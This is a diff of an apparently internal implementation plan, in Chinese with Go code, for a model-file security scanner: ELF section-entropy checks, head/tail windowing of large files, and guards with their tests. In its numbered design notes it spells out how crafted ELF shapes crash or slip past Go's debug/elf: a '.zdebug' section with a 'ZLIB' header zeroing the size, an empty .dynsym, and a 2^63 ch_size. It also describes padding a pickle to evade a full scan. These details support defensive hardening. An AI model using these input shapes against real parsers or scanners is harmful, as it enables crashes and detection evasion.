+// design: code is not random, so a section that holds instructions and measures
+// near eight bits per byte has been compressed or encrypted and something must
+// unpack it before it can run. Data is allowed to be random - a tensor blob and
+// an encrypted payload look identical to this measurement - so measuring data
+// would produce a finding per model file and none of them would mean anything.
+//
+// Only a high reading produces a line. Emitting one for every low reading would
+// put a line per section per file into every prompt for no decision value, and
+// the rule table matches on the "high-entropy-" prefix - so the threshold is
+// applied here, where the number is, and the rule table carries only what to call
+// it. That split is deliberate: severity is policy and lives in the rule table,
+// the measurement is physics and lives here.
+//
+// Two callers reach it and they hold their bytes differently: an ELF section
+// streams through countSection in fixed-size chunks and never holds the section
+// at all, while a container member is already in memory. Folding both into one
+// function over the histogram is what keeps them from disagreeing - if the
+// threshold lived on the in-memory path as well, the two would be two
+// implementations of one rule and a later edit to either would silently make an
+// identical section score differently depending on which path read it.
+//
+// total is passed rather than summed from the counts because it is the number of
+// bytes actually read, which is the byte count the entropy is normalized by, and
+// because shannonEntropy already refuses a zero total (see its comment): an empty
+// section returns 0, which is below every threshold, so it produces no line.
+func entropyVerdictFromCounts(section string, counts [256]int64, total int64, cfg BinaryConfig) (string, bool) {
+	h := shannonEntropy(counts, total)
+	if h <= cfg.HighEntropyThreshold {
+		return "", false
+	}
+	return fmt.Sprintf("high-entropy-executable-section %s %.2f", section, h), true
+}
+
+// entropyVerdict is the in-memory spelling of the same decision, for the cases
+// where the bytes are already in hand (a container member). It builds the
+// histogram and hands it to entropyVerdictFromCounts so that a section measured
+// in memory and the same section measured by streaming cannot differ.
+// （这个函数替换 Task 3 里那一版：函数体从 `h := measureEntropy(data)` 变成建直方图后转交。）
+func entropyVerdict(section string, data []byte, cfg BinaryConfig) (string, bool) {
+	var counts [256]int64
+	for _, b := range data {
+		counts[b]++
+	}
+	return entropyVerdictFromCounts(section, counts, int64(len(data)), cfg)
+}
+
+// entropyChunkBytes is the read size countSection uses. It is a constant rather
+// than a configuration field because it is not a limit: memory is one buffer of
+// this size no matter what it is set to, so making it tunable would offer an
+// operator a knob whose only effect is cache behaviour. 64 KiB is a size the
+// kernel and the read paths are already tuned for.
+const entropyChunkBytes = 64 * 1024
+```
+
+同时给 `EvidenceSet` 补一个小方法（结构证据无字节偏移，走 `Offset: 0`）。`markStructural` 已在 Task 2 随 `streamEvidence` 的预算路径定义，这里只加 `addStructured`：
 
 ```go
 // addStructured records evidence that names a property of the file rather than a
@@ -1952,33 +4630,47 @@ func readBoundedSection(sec *elf.Section, limit int64) (data []byte, bounded boo
 // address, and inventing one would make BinaryOffset a field a reader cannot
 // trust for the findings that carry it.
 func (s *EvidenceSet) addStructured(src EvidenceSource, text string) {
-	key := string(src) + "\x00" + text
-	if s.seen[key] {
-		return
-	}
-	s.seen[key] = true
-	s.Lines = append(s.Lines, EvidenceLine{Source: src, Text: text})
-}
-
-// markStructural records that the extraction of the file's structure was cut
-// short. The first reason wins, so the report names the limit that was reached
-// first rather than the last one a loop happened to notice.
-func (s *EvidenceSet) markStructural(reason string) {
-	if s.Bound.Structural {
-		return
-	}
-	s.Bound.Structural = true
-	s.Bound.Reason = reason
+	s.add(src, 0, text)
 }
 ```
 
 - [ ] **Step 5: 跑测试确认通过**
 
 ```bash
-go test ./internal/codeaudit/ -run 'TestELF|TestCollectELF' -v
+go test ./internal/codeaudit/ -run 'TestELF|TestCollectELF|TestCountSection' -v
 ```
 
 预期全 PASS。
+
+> **这一版对第一节的两个决定，写在这里而不是留给读者去猜。**
+>
+> **一、无节表（`len(ef.Sections) == 0`）走的是"去掉 fail-open"，不是"用 PT_DYNAMIC 补回 DT_NEEDED/DT_SONAME"。** 两条路里选前者，理由是后者要先把 `PT_DYNAMIC` 的 `p_vaddr` 经 `PT_LOAD` 映射回文件偏移，再把 `DT_STRTAB` 的虚地址同样映射一次才能读字符串表——这套映射本身是一段新的、需要独立夹具与独立测试的解析逻辑，而它的产出（needed/soname）只是"这个文件依赖什么"，对"这个文件有没有被加壳"这个问题不提供任何证据。真正需要修的是**结论**：熵检测的输入是可执行节，没有节表就没有可执行节，所以旧代码在这一段直接掉出去、不产生任何行也不产生任何 bound，于是"从未检查过"被报成了"没发现加壳"。改成 `markStructural` 之后，这个文件仍然拿不到 needed/soname，但它拿到了"这次没有检查过可执行节"这个**真**陈述，并且因为没有绑定可执行类型之外的例外，它在导入判定上是有界的。**代价明确**：一个节表被删掉的正常文件（少见但存在，比如某些加壳器产出的、以及某些用 `objcopy --strip-section-headers` 处理过的文件）现在会被记为结构性缺口而不是干净通过；这是刻意的方向——对一个可执行格式，"没看"必须不等于"干净"。
+>
+> **二、reason 的措辞点名的是"没有节头表"，不是"没有符号表"。** 旧代码在 `errors.Is(err, elf.ErrNoSymbols)` 时写的是 `"no dynamic symbol table (stripped or static)"`，这句话对**静态链接**的二进制是假的：静态二进制没有 `.dynsym` 但有 `.symtab`，它并不 stripped；对**完全没有节表**的文件也是假的：那不是被 strip 过，是另一种情况。新措辞只陈述实际观察到的事实——`"no dynamic symbol table (SHT_DYNSYM absent)"`——并**故意不加** `SHT_SYMTAB` 作为符号证据的兜底来源：`.symtab` 里绝大多数是**本文件自己定义**的符号（函数名、局部变量），拿它当能力证据意味着去匹配程序自己的标识符，那正是字符串族被降级时所针对的同一类误报。Task 8 的规则表因此**不受影响**：没有引入新的 evidence source，这正是重点。
+>
+> **三、节声明长度越过文件末尾（或读不满）记为结构性缺口，`size=` 仍写声明长度。** 判据是"读到的字节数 < 节头声明的字节数"。两种情况会触发，且都是同一个事实：`sh_offset`/`sh_size` 越过了文件末尾（读在 EOF 停下），或者触到了 `MaxStreamBytes` 的每文件预算。无论哪种，熵值都只覆盖了一个**前缀**，所以这个数**不报**——报出来它会和"整个节测过"的数长得一模一样，而"没测全"对一个会执行的格式绝不能走到报告里变成"测过且干净"。替代它出现的是 `section .text declares N bytes, M readable` 这一条结构化证据。`size=` 保持声明值而不是改成读到的值，是因为读者需要能把这个声明长度和那条缺口**配对**看：如果 `size=` 悄悄变成读到的数，报告里就再也看不出节头当初声明了多少。
+>
+> **四、`MaxSectionBytes` 从 `BinaryConfig` 里整个删掉，不是保留成一个改了语义的东西。** 它唯一的用途就是给"`io.ReadAll` 一个节"设上限，而那个设计会对**普通的大库**开火——一个足够大的 `.so`，它的 `.text` 会跨过任何固定的节上限，而触顶记的是结构性 bound，于是"这个库比较大"变成了阻断导入的理由。宿主实测（每个真实共享对象最大的 `SHF_EXECINSTR` `PROGBITS` 节）：`libLLVM.so.20.1` 63 048 722 字节、`libclang-18.so.18` 22 284 286、Chrome 的 `liboptimization_guide_internal.so` 20 685 714、`libwireshark.so.17.0.2` 20 175 571——16 MiB 的节上限在前四个上直接触顶。注意这个上限在**已实测的输入上都不发作**：审计语料 `models/` 下一个真实 `.so` 都没有，标定误报用的那 28 个 ollama 库单节最大 2 901 464 字节，所以它的代价是潜伏的，只在包里带上一个真实大库时发作——而那正是本平台要接受的包形状。节读取改成经 `countSection` 按固定块流过直方图之后，内存是 256 个计数器加一个 `entropyChunkBytes`（64 KiB）缓冲，与节大小无关，节上限已经**没有东西可保护**。每文件的读取预算剩下 `MaxStreamBytes`，在节循环里**跨节累减**（不是每节重置，否则成本随文件声明的可执行节数量线性增长），触到它才保持结构性。字段删除要连带 Task 14 的配置键清单和 `normalizeBinaryConfig` 一起删（本节已完成）：`MaxSectionBytes` 从来没有出现在配置键清单里，`normalizeBinaryConfig` 里那段 `if cfg.MaxSectionBytes <= 0` 也一并去掉。**不要把它加回来**，也不要指望"把 16 MiB 调大一点"能解决——任何固定值都只是把发作点往后挪。
+>
+> **五、同一份判定只能有一个实现。** `entropyVerdict` 原本直接吃 `[]byte`，而流式路径手里没有 `[]byte`——如果给流式路径再写一份阈值判断，两条路就成了一规则两实现，日后改一处就会让**同一个节**因为读它的路径不同而得到不同的分数。所以本任务（Task 5 Step 4）把判定抽成 `entropyVerdictFromCounts(section string, counts [256]int64, total int64, cfg BinaryConfig)`，`entropyVerdict` 退化成"建直方图再转交"的包装，ELF 路径走 `countSection` + `entropyVerdictFromCounts`，容器成员路径走 `entropyVerdict`，两者在 `TestEntropyVerdictIsMeasuredNotAssumed` 里被断言必须给出同一行。**拆分落在 Task 5 而不是 Task 3**：Task 3 已作为 `7e37aca` 提交，它交付的 `entropyVerdict` 就是直接吃 `[]byte` 的那一版，而两条路要到 Task 5 才同时存在（`entropyVerdictFromCounts` 与 `countSection` 都是本任务引入的）；把拆分写进 Task 3 的正文，等于描述一个从未存在过的 Task 3，按顺序执行的人在那之后会拿到一个编译不过的包。
+>
+> **六、`debug/elf` 在敌意输入上有几处不设防，这里各补一道，理由是输入不可信。** 这几条都不是"防御性编程"，而是标准库的既定行为在**敌意输入**下的直接后果，而 `ClassifyBinary` 只凭四个魔数字节就把文件送进这个函数，所以每一个 ELF 形状的输入都会走到这里，包括构造出来的。**注意 `ClassifyBinary` 不看 `EI_CLASS`，`sh_size` 是文件自己挑的字段**——下面每条都要按这个前提读。
+>
+> 第一处是**符号节解出的内容是空的**：`getSymbols64`（`file.go:675-691`）取出节的字节、只否决 `len(data)%Sym64Size != 0`，然后做 `data = data[Sym64Size:]` 摘掉保留的第 0 项。**0 是任何表项长度的倍数**，所以一个空缓冲区通过那条检查、随即在切片上 panic `slice bounds out of range [24:0]`；而长度 1..23 都不是 24 的倍数，走的是**返回 error** 的那条路，根本到不了切片。**panic 集合因此恰好是 `{0}`，不是"所有短于一个表项的长度"。** 这个边界决定了守卫的形状：守卫是"解出来的内容是空的"，**不是**"`sh_size` 小于一个符号头"。长度区间守卫不只是"比需要的宽"，它是**反的**——1..23 今天已经被 error 路径 fail-closed 挡下了，把它们也拦下来会把那次失败改写成一次静默跳过，在这个"没看绝不能读成干净"的函数里**新开一个 fail-open**。（**本计划上一版把这道守卫写成"按 `ef.Class` 取 24/16 比长度"，那是错的**：24 和 16 是**表项**长度，不是"至少要有一个表项"的判据，而且照它写的区间守卫会把 1..23 从 error 路径改写成跳过。源码行号写在这里，是为了让下一个人自己去核，而不是重新推理一遍。）
+>
+> 守卫**不做类判断**，这是有意的：`getSymbols32`（`file.go:631-633`）在它自己的切片之前有一条显式的 `if len(data) == 0 { return ... "symbol section is empty" }`，所以 32 位表**永远不会 panic**，不需要任何守卫来保安全。守卫针对的那个事实——节解出来是空的——对两个类是一样的，而一个解不出字节的表在两个类里都**没有符号可丢**，所以一道统一的检查同时覆盖两者，不必去分支 `EI_CLASS`（那正是 `ClassifyBinary` 根本不看的字段）。边界仍然恰好是"空"：长度 1..23 是另一个事实（一张畸形的表），留给读取器去报。
+>
+> "空"必须按 `debug/elf` 问的方式问，而那**不是**读节头。`Section.Data`（`file.go:107`）是 `saferio.ReadData(s.Open(), s.Size)`，而 Go 从左到右求值实参，所以 `Open` 先跑，`ReadData` 拿到的 `n` 是 `Open` 刚写下的那个值。`Section.Open`（`file.go:126`）在每次读取时都会被调用，并且在 `file.go:146` 处，对**名字以 `.zdebug` 开头、前 12 字节是 `"ZLIB"`** 的节做 `s.Size = binary.BigEndian.Uint64(b[4:12])`——**攻击者自己的字节**。于是节体为 `"ZLIB"` 加 8 个零字节的节就让 `s.Size` 变成 0，`ReadData` 于是不分配任何内存、`io.ReadFull` 对空缓冲区空成功，返回一个**非 nil 的空切片加 nil error**；`getSymbols64` 看到 `len(data) == 0`，通过倍数检查，panic。这一切在 `sh_size` 里都看不见，它仍然是普普通通的 12——所以一个只盯着节头看的读者会得出"这个守卫没必要"的结论，这正是本段存在的理由。守卫因此要按 `Data` 的顺序问同一个问题：**看 `Data` 会拿到的字节，而不是节头里的长度**（本任务用 `symbolTableIsEmpty` 封住这一点，它调用的就是符号读取器自己会调的那个 `Data`；方向也是安全的——`Data` 报 error 的地方，符号读取器会 panic）。`SectionByType` 返回**同类型里的第一个**节，这让这个形状很便宜就能构造——文件只要把自己那个 `.zdebug` 节排在真正的前面。
+>
+> 第二处是**压缩头的 `ch_size` 没有范围检查**：普通节的 `sec.Size` 来自 `sh_size`，`debug/elf` 在解析时已经拒绝把它当负数（`if int64(s.FileSize) < 0` 直接返回 `FormatError`），所以有符号比较在那里是安全的；但 `SHF_COMPRESSED` 的节 `sec.Size` 来自压缩头 `ch_size`，**同一道检查没有加在它上面**。于是一个构造出的 `ch_size = 2^63` 让 `sec.Size` 成为一个 int64 视图为负的 `uint64`，`read < int64(sec.Size)` 对任何 `read` 都为假，这个节就被当成"整节读完"——既不记结构性缺口，又因为它是可执行节而被量了熵、报了干净。这正是这条检查存在的理由被一次类型转换重新打开的 fail-open。修法是比较**无符号**（`uint64(read) < sec.Size`），两个数本来就都是字节计数。
+>
+> `SHT_SYMTAB` 有与第一处完全相同的形状，这正好是本函数**本来就不读它**的第二个理由（第一个是符号来源的误报，见上）：一个兜底来源还得替它背同样的守卫，而它提供的是本解析已经决定不用的符号。
+>
+> 这几条与 `collectELF` 开头的 `cfg = normalizeBinaryConfig(cfg)` 是同一类事：它们保护的不是"输入正常时会怎样"，而是"输入不正常时不要变成静默通过"。`normalizeBinaryConfig` 那一行的意义要单独说，因为它看着像样板：`collectELF` 直接读 `cfg.MaxStreamBytes` 当每文件预算，而 `newEvidenceSet` 与 `newStringScanner` 都会先归一化，一个零值 `BinaryConfig{}` 于是给出零预算，每个可执行节都记成"预算已花光"的结构性缺口，可执行类型的文件被拒绝导入——踩中的是将来接线的那个任务，不是现在这批测试（它们全都经 `DefaultBinaryConfig` 构造配置）。
+>
+> 每一处都要有测试钉住，否则它们会在下一次重构里被当成多余的分支删掉：**（a）** 一个 `.dynsym` 解出空内容的夹具必须不 panic 且不产出 bound（"这张表没有导入"是它的事实，不是缺口）；**（a2）** 一条 `.zdebug` 形状的夹具——名字以 `.zdebug` 开头、节体是 `"ZLIB"` 加 8 个零字节、`sh_size` 是一个普通值——必须同样不 panic，且**必须在 `sh_size` 看着正常的前提下通过**，因为这条测试的全部价值就在于它钉的是"守卫必须看解出来的长度、不能看节头"；少了它，一个只看 `sh_size` 的守卫会全绿而漏洞还在；**（b）** 一个声明长度超出可读字节的节必须记为结构性缺口，且这一条要在**无符号**语义下成立（有符号写法的失败方式正是"声明长度的高位置位时整条检查被跳过"，所以这条测试的夹具要能表达那个形状：普通节的 `sh_size` 会被 `debug/elf` 在解析期拒绝，能表达它的是 `SHF_COMPRESSED` 的压缩头）；**（c）** 传一个零值 `BinaryConfig{}` 时，一个正常的可执行节仍要被量熵而不是被记成"预算花光"。
+>
+> **（a3）反向的那条同样要钉：长度 1..23 的 `.dynsym` 必须仍然失败 fail-closed**（走 error 路径、让整个文件被记为 `Incomplete`），**不得**被守卫静默跳过。这是"区间守卫是反的"那句话的落地测试——把守卫写成 `Size < 24` 会让这条测试变红，而只测 (a) 是发现不了的。注意现有的 `TestCollectELFEmptyDynsymIsNotAStrippedFile` 钉不住 (a)：它的夹具是一个合法的 24 字节保留项，根本不触发那条切片。**这条规则的落地测试是 `TestCollectELFEvidenceFailsClosedOnATruncatedDynsym`**（在 Step 2 的用例清单里）：它用 `shortDynsym` 夹具写出 8 字节的 `.dynsym`，断言 `collectELF` 返回一个点名 `dynamic symbols` 的错误，而不是把这张格式错误的表当空跳过。
 
 - [ ] **Step 6: 提交**
 
@@ -1996,7 +4688,313 @@ git commit -m "feat(audit): read ELF imports, dependencies and section entropy a
 - Modify: `internal/codeaudit/binary_evidence.go`
 - Test: `internal/codeaudit/binary_evidence_test.go`
 
-- [ ] **Step 1: 写失败测试**
+> **本任务的步骤顺序是承重的，不要"整理"回"容器在前"。** `collectELFMember`（Step 6）调用 `collectELFReader`（Step 3 创建），而 `collectELFReader` 的薄封装又调用 `streamWithSizeSwitch`（Step 1 创建）——依赖只有一个方向，所以只有"先加窗口化开关、再拆 reader 版本、最后写容器"这个顺序能让每一次提交都编得过；把容器工作挪回最前面，恢复的正是那个编不过的顺序。
+
+- [ ] **Step 1: 加窗口化开关**
+
+追加到 `binary_evidence.go`：
+
+```go
+// streamWithSizeSwitch streams a file end to end when it is small enough to be
+// worth it, and reads only its head and tail when it is not.
+//
+// The switch exists because the two costs are not comparable. A full pass costs
+// about 3 microseconds per kibibyte at the measured rate, which is nothing for
+// the 10.8 MiB pickle that is the largest such file in the example package and
+// nine seconds for a 3 GiB shard. Above MaxFullScanBytes the pass is replaced by
+// a HeadTailBytes window at each end.
+//
+// Skipping the middle is recorded, and how it is recorded is isExecutableKind's
+// existing asymmetry rather than a new rule: a windowed pickle or ELF leaves a
+// region of an executable format unread, so it is a structural bound and a clean
+// verdict is withheld; a windowed tensor blob is a data bound and is only
+// reported. Without the first half the threshold would be an evasion: padding a
+// pickle past 64 MiB would hide a mid-stream GLOBAL and still pass.
+//
+// What that gives up is stated in the plan's boundary section rather than hidden
+// here: for a raw blob the middle is tensor data no loader reads, so nothing
+// reachable is lost. For a pickle it is a real loss - a GLOBAL emitted in the
+// middle of a long data-building run would be missed - and the two windows are
+// the mitigation rather than a cure, covering the load-time call at the front and
+// the post-load action at the back. A deployment whose packages contain such a
+// file raises maxFullScanBytes rather than being silently exempted.
+func streamWithSizeSwitch(path string, set *EvidenceSet, cfg BinaryConfig) error {
+	if set.Size > cfg.MaxFullScanBytes {
+		set.markStructural(fmt.Sprintf("file is %d bytes, above MaxFullScanBytes %d: only the head and tail %d bytes were read",
+			set.Size, cfg.MaxFullScanBytes, cfg.HeadTailBytes))
+		return streamHeadAndTail(path, set, cfg)
+	}
+	return streamEvidence(path, set, cfg, cfg.MaxStreamBytes)
+}
+
+// streamHeadAndTail runs the byte extractors over the first and last
+// HeadTailBytes of a file.
+//
+// It is what makes an appended payload visible. A zip's directory lives at the
+// end of the file and describes only the members before it, so a payload stapled
+// after the last member is inside no member and would otherwise be read by
+// nothing; the same reasoning covers a section appended past an ELF's last
+// section header.
+//
+// The window size is a parameter rather than a constant because two callers want
+// different ones: a container always reads its two ends, while a large blob reads
+// its ends only because it was too large to read whole.
+//
+// The pickle interpreter is gated here the same way it is gated everywhere else:
+// it runs only when set.Kind is KindPickle, and only over the head window. That
+// gating is what keeps this path from being a bound on every archive - a zip's own
+// bytes are not an opcode stream, and KindArchive is an executable kind, so an
+// ungated interpreter would set Bound.Structural on every .pt and .whl. The head
+// window is a valid prefix of the opcode stream and can be parsed; the tail window
+// is a splice out of the middle, and feeding a spliced fragment to a stateful
+// parser would make it read the splice as a continuation and invent targets out of
+// data bytes, so the tail goes to the strings pass alone. Nothing is lost by that:
+// this path is only reached above MaxFullScanBytes, where the file is already
+// recorded as structurally bounded.
+func streamHeadAndTail(path string, set *EvidenceSet, cfg BinaryConfig) error {
+	f, err := os.Open(path)
+	if err != nil {
+		return fmt.Errorf("open %s: %w", path, err)
+	}
+	defer f.Close()
+	info, err := f.Stat()
+	if err != nil {
+		return fmt.Errorf("stat %s: %w", path, err)
+	}
+
+	headTailBytes := cfg.HeadTailBytes
+	scanner := newStringScanner(set, cfg)
+	var pickles *pickleScanner
+	if set.Kind == KindPickle {
+		pickles = newPickleScanner(set)
+	}
+
+	head := make([]byte, headTailBytes)
+	n, err := f.ReadAt(head, 0)
+	if err != nil && err != io.EOF {
+		return fmt.Errorf("read %s: %w", path, err)
+	}
+	if _, err := scanner.Write(head[:n]); err != nil {
+		return err
+	}
+	if pickles != nil {
+		if _, err := pickles.Write(head[:n]); err != nil {
+			return err
+		}
+	}
+
+	if info.Size() > headTailBytes {
+		tail := make([]byte, headTailBytes)
+		at := info.Size() - headTailBytes
+		n, err := f.ReadAt(tail, at)
+		if err != nil && err != io.EOF {
+			return fmt.Errorf("read %s: %w", path, err)
+		}
+		// The offset is rebased so that a tail literal reports where it actually
+		// is: an offset that silently restarted at zero would make two different
+		// payloads report the same location. The interpreter is not rebased and not
+		// fed the tail at all - see the note above.
+		scanner.at = at
+		if _, err := scanner.Write(tail[:n]); err != nil {
+			return err
+		}
+	}
+	scanner.Flush()
+	if pickles != nil {
+		pickles.Flush()
+	}
+	return nil
+}
+```
+
+提交：
+
+```bash
+git add internal/codeaudit/binary_evidence.go
+git commit -m "feat(audit): window large files to their head and tail"
+```
+
+- [ ] **Step 2: 钉住窗口化开关的测试**
+
+在 `binary_evidence_test.go` 的 import 块补 `"fmt"`（这条用例用 `fmt.Sprintf` 拼出期望的窗口尺寸；`os` 与 `strings` 已在 Task 2 引入，`os.Stat` 用来把 `set.Size` 设成文件的真实大小）。
+
+追加到 `binary_evidence_test.go`：
+
+```go
+// TestStreamWithSizeSwitchWindowsAFileAboveTheFullScanBudget pins the switch in
+// both directions. At or below the budget the whole file is read, so a literal
+// that exists only in the middle is found and no bound is recorded; above it the
+// two windows are read, so the head literal is found, the middle one is not, and
+// the skip is a structural bound naming the threshold and the window size.
+//
+// The threshold is read from cfg rather than a constant, so a small config drives
+// the same branch a 64 MiB fixture would and the test does not have to build that
+// fixture. Do not "fix" this by building a real oversized file.
+//
+// What a structural bound costs a package is not decided here. Task 9's scanner
+// folds it through isExecutableKind: a windowed pickle or ELF is withheld, a
+// windowed raw blob is only recorded. This test asserts the record, not the
+// block, and must not be read as the place that decides deletion.
+func TestStreamWithSizeSwitchWindowsAFileAboveTheFullScanBudget(t *testing.T) {
+	dir := t.TempDir()
+	const fullScan, window = 4096, 64
+	cfg := DefaultBinaryConfig()
+	cfg.MaxFullScanBytes = fullScan
+	cfg.HeadTailBytes = window
+
+	small := make([]byte, fullScan)
+	copy(small, "\x00SMALL_HEAD\x00")
+	copy(small[fullScan/2:], "\x00SMALL_MIDDLE\x00")
+
+	large := make([]byte, fullScan*2)
+	copy(large, "\x00LARGE_HEAD\x00")
+	copy(large[fullScan:], "\x00LARGE_MIDDLE\x00")
+	copy(large[len(large)-13:], "\x00LARGE_TAIL\x00")
+
+	for _, tc := range []struct {
+		file       string
+		content    []byte
+		wantFound  []string
+		wantAbsent []string
+		wantBound  bool
+	}{
+		{"at_budget.bin", small, []string{"SMALL_HEAD", "SMALL_MIDDLE"}, nil, false},
+		{"above_budget.bin", large, []string{"LARGE_HEAD", "LARGE_TAIL"}, []string{"LARGE_MIDDLE"}, true},
+	} {
+		t.Run(tc.file, func(t *testing.T) {
+			path := writeTestBytes(t, dir, tc.file, tc.content)
+			set := newTestEvidence(path, KindRaw)
+			// CollectEvidence sets Size from the file itself, and the switch decides
+			// the branch from it. A zero Size would take the whole-file branch for
+			// every file and the test would pass without ever exercising the window.
+			info, err := os.Stat(path)
+			if err != nil {
+				t.Fatal(err)
+			}
+			set.Size = info.Size()
+
+			if err := streamWithSizeSwitch(path, set, cfg); err != nil {
+				t.Fatalf("streamWithSizeSwitch: %v", err)
+			}
+
+			texts := map[string]bool{}
+			for _, l := range set.Lines {
+				texts[l.Text] = true
+			}
+			for _, want := range tc.wantFound {
+				if !texts[want] {
+					t.Errorf("%q missing from the evidence", want)
+				}
+			}
+			for _, absent := range tc.wantAbsent {
+				if texts[absent] {
+					t.Errorf("%q was read; the middle of an oversized file must be skipped", absent)
+				}
+			}
+			if set.Bound.Structural != tc.wantBound {
+				t.Fatalf("Bound.Structural = %t, want %t (reason %q)", set.Bound.Structural, tc.wantBound, set.Bound.Reason)
+			}
+			if !tc.wantBound {
+				return
+			}
+			if !strings.Contains(set.Bound.Reason, "MaxFullScanBytes") {
+				t.Errorf("bound reason = %q, want it to name MaxFullScanBytes", set.Bound.Reason)
+			}
+			if !strings.Contains(set.Bound.Reason, fmt.Sprintf("head and tail %d", window)) {
+				t.Errorf("bound reason = %q, want it to name the %d-byte head/tail window", set.Bound.Reason, window)
+			}
+		})
+	}
+}
+```
+
+这条测试只断言"开关留下了什么记录"，不断言"阻断"。结构性缺口能不能挡住导入，不由这条开关决定，而是由消费方 `isExecutableKind` 决定：Task 9 的 `ScanDirectory` 在 `if set.Bound.Structural` 分支里按 `isExecutableKind(kind)` 分流，可执行类型记 `BoundedExecutable`、其余记 `BoundedData`（Task 7 的 `TestCollectEvidenceWindowsAFileAboveTheSizeThreshold` 才钉那条谓词）。本条用例断言的是 `Bound.Structural` 与 `Bound.Reason` 这两个记录本身。
+
+提交：
+
+```bash
+git add internal/codeaudit/binary_evidence_test.go
+git commit -m "test(audit): pin the head and tail windowing switch"
+```
+
+- [ ] **Step 3: 把 `collectELF` 拆出 reader 版本**
+
+`collectELF(path, ...)` 与 `collectELFMember` 需要共用同一段解析逻辑，所以把 Task 5 的实现体抽到一个以 `io.ReaderAt` 为入口的内核上，`collectELF` 变成薄封装。修改 `binary_evidence.go` 中 Task 5 写的 `collectELF`：
+
+本步的测试就是 Task 5 已有的那一族 ELF 用例：它们从此要经 `collectELF` 薄封装进入 `streamWithSizeSwitch`、再进解析体，而在默认的 64 MiB 预算下这些夹具都会整份读完，所以必须**一字不改地保持全绿**——这就是"这次拆分只换了那个在消息里命名文件的参数、别的什么都没动"的证据。
+
+```go
+// collectELF reads a file's ELF structure into evidence.
+func collectELF(path string, set *EvidenceSet, cfg BinaryConfig) error {
+	// Resolve a zero config before it reaches streamWithSizeSwitch: that switch
+	// reads cfg.MaxFullScanBytes, and a zero there would read every non-empty file
+	// as above a 0-byte budget and window it. collectELFReader normalizes for the
+	// structural pass, but the stream pass runs first and is bounded from here.
+	cfg = normalizeBinaryConfig(cfg)
+	f, err := os.Open(path)
+	if err != nil {
+		return fmt.Errorf("open %s: %w", path, err)
+	}
+	defer f.Close()
+	// The stream pass and the structural pass are separate on purpose: the
+	// stream pass reads the file front to back for literals, and the structural
+	// pass seeks. Sharing one handle between them would make the structural
+	// parse depend on where the stream pass happened to stop.
+	//
+	// Through streamWithSizeSwitch rather than streamEvidence directly, so that a
+	// large shared object is windowed at its ends like any other large blob
+	// instead of being streamed whole.
+	if err := streamWithSizeSwitch(path, set, cfg); err != nil {
+		return err
+	}
+	return collectELFReader(f, set, cfg, path)
+}
+
+// collectELFReader is the ELF parse itself, over any random-access reader. It is
+// separate from collectELF so that a container member - which is a stream, not a
+// path - is parsed by the same code rather than by a second implementation that
+// would drift from this one.
+//
+// It carries the whole of Task 5's body: the sectionless structural bound, the
+// .dynsym walk and its too-short-section guard, the per-section summary lines,
+// and the streamed entropy pass through countSection and entropyVerdictFromCounts.
+// All of that reads through io.ReaderAt already - debug/elf takes one, and
+// elf.Section.Open returns an io.Reader - so the move changes nothing but the
+// parameter that names the file in messages.
+//
+// Task 5's `cfg = normalizeBinaryConfig(cfg)` moves here with the body, and it
+// has to stay here rather than in the wrapper: collectELFMember reaches this
+// parse directly, so normalizing only on the path side would leave every
+// container member parsed against a config nobody resolved.
+//
+// There is no size parameter: the parse bounds itself per file through
+// cfg.MaxStreamBytes, applied as the budget countSection stops at, and a size
+// the body never read would be a parameter that only invites the assumption that
+// something is bounds-checked elsewhere.
+func collectELFReader(r io.ReaderAt, set *EvidenceSet, cfg BinaryConfig, name string) error {
+	ef, err := elf.NewFile(r)
+	if err != nil {
+		return fmt.Errorf("parse elf %s: %w", name, err)
+	}
+	defer ef.Close()
+	// ... (Task 5 的解析体原样搬到这里，把 path 换成 name)
+}
+```
+
+两个此前没有写下来的点，这里明确一次：
+
+> **`collectELF` 的产物里没有字符串证据，是分离而不是漏做。** Task 5 的 `collectELF` 只做结构解析，本步才把 `streamWithSizeSwitch` 接在它前面，所以一个有路径的 ELF 最终拿到的是"字符串 + 结构"两份证据。顺序是先流后解析，而不是反过来：结构解析要 seek，流式读取要顺序读到底，共用一个句柄会让结构解析的位置取决于流式读取停在了哪里。`streamWithSizeSwitch` 而不是 `streamEvidence`，是为了让一个大 `.so` 和其它大 blob 一样按"头 + 尾"开窗，而不是整份读进来。
+
+> **容器成员走的是另一条路：它先被判类、读进内存，再决定要不要解析。** 一个 zip 成员若不是 ELF/pickle 就不读进内存、不解析（这也是容器解压后的总体积不被 `MaxArchiveMemberBytes` 约束的原因）；是 ELF 就走 `collectELFReader(bytes.NewReader(data), ...)`，与有路径的 ELF 用同一段解析体。字符串证据在这一步由 `collectELFMember` 自己跑（成员已经在内存里，不需要再按大小开窗），所以成员和有路径文件最终拿到同两类证据，只是字符串那一段来自不同的读取路径——这也是 `entropyVerdictFromCounts` 必须同时被两条读取路径使用的原因之一。
+
+提交：
+
+```bash
+git add internal/codeaudit/binary_evidence.go
+git commit -m "refactor(audit): share the ELF parse between paths and container members"
+```
+
+- [ ] **Step 4: 写失败测试**
 
 先在 `binary_evidence_test.go` 的 import 块补 `"bytes"`（`zipFixture` 与 gzip 夹具都要用 `bytes.Buffer`；Go 不允许未使用的 import，所以在真的用到它的这一步才加）。
 
@@ -2102,22 +5100,96 @@ func TestCollectArchiveEvidenceBoundsMemberCount(t *testing.T) {
 	}
 }
 
-// TestCollectCompressedEvidence pins gzip: the stream is decompressed through
-// the same evidence machinery, so a pickle hidden in a .gz is read as a pickle.
+// TestCollectArchiveEvidenceBoundsAMemberAtTheByteBudget pins the per-member
+// structural bound, which is the one a container's import is actually withheld
+// on: isExecutableKind(KindArchive) is true, so a structural bound here stops the
+// scan passing, and the bound is recorded because a member's tail was never
+// looked at. Without this test the guard is unpinned - removing it leaves the
+// whole suite green, which is the shape a guard silently drops into.
+//
+// A small budget drives the same branch as a member above the default 256 MiB:
+// the guard reads cfg.MaxArchiveMemberBytes, so a tiny config reaches it without
+// a quarter-gigabyte fixture. The budget is the member's own length because that
+// is the only value that reaches this guard rather than the dispatcher's earlier
+// declared-size check: a smaller budget makes collectArchive mark the member from
+// its declared UncompressedSize64 and break before the member is opened, which is
+// a different guard. The comparison is >= rather than >, so a member exactly at
+// the budget is bounded as well - the read was capped, and whether the member
+// continued past the cap cannot be told without a further probe.
+//
+// The reason is asserted, not only the flag, because it is the line an operator
+// reads when an import is held back: a bare Bound.Structural would not say which
+// member hit which limit.
+func TestCollectArchiveEvidenceBoundsAMemberAtTheByteBudget(t *testing.T) {
+	dir := t.TempDir()
